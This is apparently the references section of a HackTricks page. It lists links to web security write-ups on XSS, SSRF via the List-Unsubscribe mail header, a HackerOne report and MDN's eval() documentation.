- [Turning a harmless XSS behind a WAF into a realistic phishing vector](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/)
- [XSS and SSRF via the List-Unsubscribe SMTP Header in Horde Webmail and Nextcloud Mail](https://security.lauritz-holtmann.de/post/xss-ssrf-list-unsubscribe/)
- [HackerOne Report #2902856 - Nextcloud Mail List-Unsubscribe SSRF](https://hackerone.com/reports/2902856)
- [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
- [MDN eval()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)

{{#include ../../banners/hacktricks-training.md}}
